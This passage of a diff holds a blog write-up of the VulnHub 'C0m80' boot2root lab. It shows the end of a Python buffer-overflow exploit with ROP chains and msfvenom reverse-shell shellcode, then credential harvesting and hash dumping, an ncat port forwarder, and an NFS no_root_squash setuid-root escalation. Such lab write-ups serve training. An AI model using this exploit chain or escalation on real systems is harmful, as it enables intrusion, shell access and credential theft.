+        <span class="n">boundint</span> <span class="p">(</span><span class="n">addr</span> <span class="o">-</span> <span class="mh">0x5e5b30c4</span><span class="p">,</span> <span class="mi">32</span><span class="p">),</span>
+        <span class="c1"># add dword ptr [ebx + 0x5e5b30c4], eax ; pop edi ; ret
+</span>        <span class="mh">0x62501a45</span><span class="p">,</span>
+        <span class="c1"># junk
+</span>        <span class="mh">0x12345678</span><span class="p">,</span>
+        <span class="c1"># ExitThread (0x87654321)
+</span>        <span class="n">func_ExitThread</span><span class="p">,</span>
+        <span class="mh">0x87654321</span>
+    <span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
+
+<span class="c1"># this bypass the 12 pointers limits by building a second stage payload that
+# we'll later pivot to
+</span><span class="k">def</span> <span class="nf">write_data</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">sebp</span> <span class="o">=</span> <span class="s">'B'</span> <span class="o">*</span> <span class="mi">4</span><span class="p">,</span> <span class="n">align</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span> <span class="n">padding</span> <span class="o">=</span> <span class="s">' '</span><span class="p">,</span> <span class="n">verbose</span> <span class="o">=</span> <span class="bp">False</span><span class="p">):</span>
+    <span class="c1"># pad data so it is aligned
+</span>    <span class="n">remain</span> <span class="o">=</span> <span class="nb">len</span> <span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="n">align</span>
+    <span class="c1">#print 'original len (data) : %d' % len (data)
+</span>    <span class="k">if</span> <span class="n">remain</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="n">data</span> <span class="o">+=</span> <span class="p">(</span><span class="n">align</span> <span class="o">-</span> <span class="n">remain</span><span class="p">)</span> <span class="o">*</span> <span class="n">padding</span>
+    <span class="c1">#print 'padded   len (data) : %d' % len (data)
+</span>
+    <span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span> <span class="p">(</span><span class="n">data</span><span class="p">),</span> <span class="n">align</span><span class="p">):</span>
+        <span class="n">value</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">data</span><span class="p">[</span><span class="n">idx</span> <span class="p">:</span> <span class="n">idx</span><span class="o">+</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="c1">#print 'Writing "%s" at 0x%x' % (data[idx : idx+4], addr + idx)
+</span>        <span class="n">payload</span> <span class="o">=</span> <span class="n">patch_once</span> <span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">idx</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="n">verbose</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s">'packed : </span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span> <span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+            <span class="k">if</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span> <span class="ow">in</span> <span class="n">payload</span> <span class="ow">or</span> <span class="s">'</span><span class="se">\x0a</span><span class="s">'</span> <span class="ow">in</span> <span class="n">payload</span> <span class="ow">in</span> <span class="s">'</span><span class="se">\x0d</span><span class="s">'</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
+                <span class="k">print</span> <span class="s">'[-] There is a NULL for addr = 0x</span><span class="si">%08</span><span class="s">x , value = 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="p">(</span><span class="n">addr</span> <span class="o">+</span> <span class="n">idx</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+
+        <span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">target_ip</span><span class="p">,</span> <span class="n">target_port</span><span class="p">)</span>
+        <span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="n">sebp</span><span class="p">)</span>
+        <span class="n">sleep</span> <span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
+        <span class="n">target</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
+
+<span class="c1"># write command
+</span><span class="n">cmd</span> <span class="o">=</span> <span class="s">'rundll32 Z:</span><span class="se">\\</span><span class="s">ftpsvr</span><span class="se">\\</span><span class="s">bkp</span><span class="se">\\</span><span class="s">shell.dll'</span>
+
+<span class="n">start_data</span> <span class="o">=</span> <span class="mh">0x405060</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">start_data</span><span class="p">,</span> <span class="n">cmd</span><span class="p">)</span>
+
+<span class="c1"># VirtualAlloc
+</span><span class="n">addr_rop_VirtualAlloc</span> <span class="o">=</span> <span class="mh">0x408610</span>
+<span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="n">func_VirtualAlloc</span><span class="p">,</span>
+    <span class="c1"># JUNK
+</span>    <span class="mh">0x12345678</span><span class="p">,</span>
+    <span class="c1"># ret addr
+</span>    <span class="n">addr_ret</span><span class="p">,</span>
+    <span class="c1"># addr
+</span>    <span class="c1"># -&gt; 0x50782172 + 0x615f6f47 * 2 = 0x13370000
+</span>    <span class="mh">0x50782172</span><span class="p">,</span>
+    <span class="c1"># size 
+</span>    <span class="c1"># -&gt; 0x7f56772e + 0x40554469 * 2 = 0x10000
+</span>    <span class="mh">0x7f56772e</span><span class="p">,</span>
+    <span class="c1"># alloc type = COMMIT + RESERVE = 0x3000
+</span>    <span class="c1"># -&gt; 0x577f3540 + 0x54407d60 * 2 = 0x3000
+</span>    <span class="mh">0x577f3540</span><span class="p">,</span>
+    <span class="c1"># protect = READ WRITE EXECUTE
+</span>    <span class="c1"># -&gt; 0x4d216946 + 0x596f4b7d * 2 = 0x40
+</span>    <span class="mh">0x4d216946</span><span class="p">,</span>
+    <span class="c1"># ExitThread ()
+</span>    <span class="n">func_ExitThread</span><span class="p">,</span>
+    <span class="mh">0x87654321</span><span class="p">,</span>
+    <span class="mh">0xdeadbeef</span>
+<span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
+
+<span class="n">has_modif</span> <span class="o">=</span> <span class="mi">4</span>
+<span class="c1"># write func_system
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="c1"># fix addr
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x615f6f47</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">8</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x615f6f47</span><span class="p">))</span>
+<span class="c1"># fix size
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x40554469</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">12</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x40554469</span><span class="p">))</span>
+<span class="c1"># fix alloc type
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x54407d60</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x54407d60</span><span class="p">))</span>
+<span class="c1"># fix protect
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x596f4b7d</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">+</span> <span class="mi">20</span> <span class="o">+</span> <span class="n">has_modif</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x596f4b7d</span><span class="p">))</span>
+
+<span class="c1"># pivot to VirtualAlloc()
+</span><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
+<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_leave</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_rop_VirtualAlloc</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
+
+<span class="c1"># system (cmd)
+</span><span class="k">print</span> <span class="s">'[+] cmd : 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="n">start_data</span>
+<span class="k">print</span> <span class="s">'[+] sys : 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="n">addr_rop_system</span>
+
+<span class="c1"># write system
+</span><span class="n">ropchain</span> <span class="o">=</span> <span class="p">[</span>
+    <span class="c1"># system()
+</span>    <span class="c1"># 0x517f6746 + 0x5760726b * 2 = 0x404c1c = func_system
+</span>    <span class="mh">0x517f6746</span><span class="p">,</span>
+    <span class="c1"># pop ebx ; ret
+</span>    <span class="mh">0x62501033</span><span class="p">,</span>
+    <span class="c1"># 0x61435170 + 0x4f7e7f78 * 2 = 0x405060
+</span>    <span class="mh">0x61435170</span><span class="p">,</span>
+    <span class="c1"># ExitThread ()
+</span>    <span class="n">func_ExitThread</span><span class="p">,</span>
+    <span class="mh">0x87654321</span><span class="p">,</span>
+<span class="p">]</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">pack_rop</span> <span class="p">(</span><span class="n">ropchain</span><span class="p">)</span>
+
+<span class="c1"># write func_system
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x5760726b</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x5760726b</span><span class="p">))</span>
+
+<span class="c1"># write cmd addr
+</span><span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x4f7e7f78</span><span class="p">))</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="mh">0x4f7e7f78</span><span class="p">))</span>
+
+<span class="c1"># pivot and execute system()
+</span><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
+<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_leave</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_rop_system</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
+<span class="n">target</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span>
+
+<span class="k">print</span> <span class="s">'addrof (shellcode) = 0x</span><span class="si">%08</span><span class="s">x'</span> <span class="o">%</span> <span class="n">addr_shellcode</span>
+
+<span class="c1"># msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.56.102 LPORT=4444 -f python -b '\x00\x0a'
+</span><span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xba\x10\xf6\xd4\x6c\xdd\xc6\xd9\x74\x24\xf4\x5e\x31</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc9\xb1\x12\x31\x56\x12\x83\xc6\x04\x03\x46\xf8\x36</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x99\x57\xdf\x40\x81\xc4\x9c\xfd\x2c\xe8\xab\xe3\x01</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x8a\x66\x63\xf2\x0b\xc9\x5b\x38\x2b\x60\xdd\x3b\x43</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xb3\xb5\x84\xf5\x5b\xc4\xf4\xe8\xc7\x41\x15\xba\x9e</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x01\x87\xe9\xed\xa1\xae\xec\xdf\x26\xe2\x86\xb1\x09</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\x70\x3e\x26\x79\x59\xdc\xdf\x0c\x46\x72\x73\x86\x68</span><span class="s">"</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="s">"</span><span class="se">\xc2\x78\x55\xea</span><span class="s">"</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">buf</span>
+
+<span class="k">print</span> <span class="s">'sizeof shellcode : </span><span class="si">%</span><span class="s">d'</span> <span class="o">%</span> <span class="nb">len</span> <span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
+
+<span class="c1"># pivot and execute shellcode
+</span><span class="n">payload</span> <span class="o">=</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">10</span> <span class="o">+</span> <span class="n">shellcode</span>
+<span class="n">write_data</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">,</span> <span class="n">addr_shellcode</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># trigger exec
+</span><span class="n">target</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="n">rhost</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
+<span class="n">do_overflow</span> <span class="p">(</span><span class="n">target</span><span class="p">,</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_shellcode</span> <span class="o">+</span> <span class="mi">10</span><span class="p">),</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span> <span class="p">(</span><span class="s">'&lt;I'</span><span class="p">,</span> <span class="n">addr_shellcode</span> <span class="o">+</span> <span class="mh">0x500</span> <span class="o">-</span> <span class="mi">4</span><span class="p">))</span>
+<span class="n">target</span><span class="o">.</span><span class="n">close</span> <span class="p">()</span></pre></td></tr></tbody></table></code></pre></figure>
+
+<h1 id="post-exploitation--privilege-escalation">Post-Exploitation : Privilege Escalation</h1>
+
+<p>For privilege escalation, usual checks are made:</p>
+<ul>
+  <li>processes running as root</li>
+  <li>cronjobs</li>
+  <li>suid binaries</li>
+  <li>credentials</li>
+  <li>misconfigured services</li>
+  <li>trust relationships : probably get info somewhere else, come back and root</li>
+  <li>kernel version</li>
+  <li>etc</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+70
+71
+72
+73
+74
+</pre></td><td class="code"><pre>msf exploit(handler) &gt; sessions -i 1
+[*] Starting interaction with 1...
+id
+uid=1000(b0b) gid=1001(b0b) groups=1001(b0b)
+python --version
+Python 2.7.6
+python -c 'import pty; pty.spawn ("/bin/dash")'
+$ id
+id
+uid=1000(b0b) gid=1001(b0b) groups=1001(b0b)
+$ cat /var/www/html/bugs/config/config_inc.php
+cat /var/www/html/bugs/config/config_inc.php
+&lt;?php
+
+$g_hostname               = 'localhost';
+$g_db_type                = 'mysqli';
+$g_database_name          = 'bugtracker';
+$g_db_username            = 'root';
+$g_db_password            = 'bobistheking';
+$g_default_timezone       = 'Europe/London';
+$g_crypto_master_salt     = 'C+ydu13FkvkVCLSWu85CqxSqS7ougj7EEC+5+CLqF2I=';
+
+$ mysql -uroot -p
+mysql -uroot -p
+Enter password: bobistheking
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 1465
+Server version: 5.5.57-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2017, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql&gt; use bugtracker
+use bugtracker
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&gt; select username,password from mantis_user_table;
+select username,password from mantis_user_table;
+
++----------+----------------------------------+
+| username | password                         |
++----------+----------------------------------+
+| bob      | facc581c941193bc7edc6b207706fb6e |
+| guest    | 084e0343a0486ff05530df6c705c8bb4 |
+| Jeff     | facc581c941193bc7edc6b207706fb6e |
+| alice    | 247c42400cd044c577400470127b0063 |
+| DCheung  | 739e3b6d4c36092dcc5ac222b8e1360d |
++----------+----------------------------------+
+
+5 rows in set (0.03 sec)
+mysql&gt; quit
+quit
+Bye
+$ cat /etc/exports
+cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#        to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/ftpsvr/bkp           *(rw,sync,no_root_squash,no_subtree_check)</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>We got our way to escalate our privileges!
+no_root_squash is a big no no for NFS configuration.
+This allow users to upload setuid root binaries on the server through
+that misconfigured share.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+</pre></td><td class="code"><pre> no_root_squash - Allows root users on client computers to have root
+access on the server. Mount requests for root are not be mounted to
+the anonomous user. This option is needed for diskless clients.</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Looking at the folder, we get to see that the bkp folder is only readable by
+members of the ‘backup’ group. Reading /etc/passwd yield al1ce as being a
+member of that group.</p>
+
+<p>We first need to login as al1ce before enjoying our root suid shell.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+</pre></td><td class="code"><pre>b0b@C0m80:~$ ls -la .ssh/
+total 24
+drwx------  2 b0b b0b 4096 Sep 23 18:42 .
+drwxr-xr-x 21 b0b b0b 4096 Oct 11 12:05 ..
+-rw-------  1 b0b b0b 1766 Sep 22 21:05 id_rsa
+-rw-r--r--  1 b0b b0b  391 Sep 22 21:05 id_rsa.pub
+-rw-r--r--  1 b0b b0b  222 Sep 23 02:58 known_hosts
+-rw-rw-r--  1 b0b b0b  181 Sep 23 04:32 .save~
+b0b@C0m80:~$ cat .ssh/.save~ 
+
+###### NO PASWORD HERE SRY ######
+
+I'm using my new password manager
+
+           PWMangr2
+
+      just a note to say
+
+   WELL DONE &amp; KEEP IT UP ;D
+
+#################################</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>I went looking for that password manager and ended up finding a page:
+/home/b0b/.wine/drive_c/users/b0b/Application Data/Mozilla/Extensions/PWMangr2.html</p>
+
+<p>meterpreter&gt; download ‘/home/b0b/.wine/drive_c/users/b0b/Application Data/Mozilla/Extensions/PWMangr2.html’</p>
+
+<p>Opening that .html file on a browser, we can access the passwords by guessing
+“alice”.
+Hints are quite a bad idea for logins. Most of the time than not, user have bad
+password habits and their hints often give out their password or reduce the
+search space tremendously.</p>
+
+<p>We can find the password for b0b thanks to the hint, the password is : alice.
+The password for al1ce is not valid for her account but for b0b’s ssh private key.</p>
+
+<p>If you’ve searched through al1ce home folder, you’d have seen that we can
+connect to her account thanks to her .ssh/authorized_keys which includes bob’s
+public key.</p>
+
+<p>The SSH service is only locally reachable.
+To reach it from outside, we can use ncat as a port forwarder.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+</pre></td><td class="code"><pre>b0b@C0m80:~$ ncat --sh-exec "ncat ::1 65122" -l 10022 --keep-open</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>SSH in al1ce account using the exfiltrated bob’s private key
+and the key password (7M6Kt8tC8X5Qz99@Eeb8592Z$Fd@u286).</p>
+
+<p>With al1ce account, we now have access to /ftpsvr/bkp/.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td><td class="code"><pre>al1ce@C0m80:~$ id
+uid=1001(al1ce) gid=34(backup) groups=34(backup)
+al1ce@C0m80:~$ ls -lash /ftpsvr/bkp/
+total 2.7M
+4.0K drwxrwx--- 2 root   backup 4.0K Sep 23 02:37 .
+4.0K drwxr-xr-x 3 b0b    b0b    4.0K Sep 23 01:07 ..
+2.7M -rw-r--r-- 1 backup backup 2.7M Oct 11 17:20 ftp104.bkp</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Using our NFS access, we upload a root setuid binary.</p>
+
+<p>On our attacker’s machine:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+</pre></td><td class="code"><pre>root@kali:~/c0m80# mount 192.168.56.106:/ftpsvr/bkp/ bkp/
+root@kali:~/c0m80# cp bash bkp/
+root@kali:~/c0m80# ls -lash bkp/bash
+964K -rwxr-xr-x 1 root root 964K Oct 11  2017 bkp/bash
+root@kali:~/c0m80# chmod +s bkp/bash 
+root@kali:~/c0m80# ls -lash bkp/bash
+964K -rwsr-sr-x 1 root root 964K Oct 11  2017 bkp/bash
+root@kali:~/c0m80# umount bkp</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>Now with al1ce account:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text"><table class="rouge-table"><tbody><tr><td class="gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+</pre></td><td class="code"><pre>al1ce@C0m80:~$ ls -lash /ftpsvr/bkp/bash 
+964K -rwsr-sr-x 1 root root 964K Oct 11 17:23 /ftpsvr/bkp/bash
+al1ce@C0m80:~$ /ftpsvr/bkp/bash -p
+bash-4.3# id
+uid=1001(al1ce) gid=34(backup) euid=0(root) egid=0(root) groups=0(root),34(backup)
+bash-4.3# ls -lash /root/flag.txt 
+4.0K -rw-r--r-- 1 root root 400 Sep 23 20:29 /root/flag.txt
+bash-4.3# cat /root/flag.txt 
+############## WELL DONE ###############
+
+You dealt BestestSoftware a killer C0m80
+
+I really hope you enjoyed the challenge
+and learned a thing of two while on your
+journey here.
+
+Please leave feelback &amp; comments at:    
+
+      https://3mrgnc3.ninja/
+
+All the best.
+
+  3mrgnc3 
+
+  ;D
+
+
+############  ROOT FLAG ##############
+
+   K1ll3rC0m80D3@l7&amp;i5mash3dth1580x
+
+######################################</pre></td></tr></tbody></table></code></pre></figure>
+
+<p>And that’s it for that VM, we rooted it, we’re god on it.</p>
+
+<h1 id="conclusion">Conclusion</h1>
+
+<p>This VM was interesting on multiple levels:</p>
+<ul>
+  <li>enumerate enumerate enumerate</li>
+  <li>classic pentesting : nmap, enum4linux, showmount, etc</li>
+  <li>exploit development</li>
+  <li>multiple scripts had to be written</li>
+  <li>it was not another VM with an easily exploitable RFI, LFI or SQLi</li>
+</ul>
+
+<p>I hope you enjoyed the read,</p>
+
+<p>Until next time,</p>
+
+<p>m_101</p>
+
+  </div>
+
+  <div class="post-navigation">
+    
+    <a class="post-prev" href="/2017/08/30/rhme3-qualifier-heap-exploitaiton.html">Previous : RHMe3 Qualifier - Heap Exploitaiton</a>
+    
+
+    
+    <a class="post-next" href="/2018/04/28/yet-another-osce-review.html">Next : Yet Another OSCE Review</a>
+    
+  </div>
+
+  
+    <div id="disqus_thread"></div>
+    <script>
+        var disqus_config = function () {
+            this.page.url = "http://localhost:4000/2017/10/12/vulnhub-c0m80-boot2root.html";
+            this.page.identifier = "/2017/10/12/vulnhub-c0m80-boot2root";
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+
+            s.src = '//binholic.disqus.com/embed.js';
+
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+  
+
+</article>
+
+      </div>
+    </div>
+
+    <footer class="site-footer">
+
+  <div class="wrapper">
+
+      <div class="site-footer">
+        <ul class="social-media-list">
+          
+          <li>
